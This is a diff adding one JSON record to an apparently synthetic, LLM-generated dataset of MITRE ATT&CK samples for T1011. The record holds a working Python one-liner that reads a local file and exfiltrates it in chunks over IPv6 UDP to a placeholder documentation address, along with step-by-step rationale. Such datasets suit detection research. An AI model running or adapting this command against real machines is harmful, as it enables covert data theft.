@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); addr=(\"2001:db8:ab:1::7\", 49160, 0, 0); d=open(\"/Users/Shared/.cache.db\",\"rb\").read(); [s.sendto(d[i:i+900], addr) for i in range(0,len(d),900)]; s.close()'",
+  "explanation": "Exfiltrates data over IPv6 UDP to a high, uncommon port, leveraging a medium (IPv6 datagrams) distinct from typical IPv4/TCP C2. Uses documentation-only IPv6 space to remain safe for lab demonstration and aligns with T1011 by using an alternate network medium.",
+  "rationale_steps": [
+    "Open an IPv6 UDP socket with Python's socket module.",
+    "Select an uncommon destination port (49160) and documentation IPv6 address to avoid real targets.",
+    "Read the file and transmit in chunks via IPv6 datagrams (alternate medium vs common IPv4/TCP).",
+    "No obfuscation applied; user-level privileges only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-b86667be",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
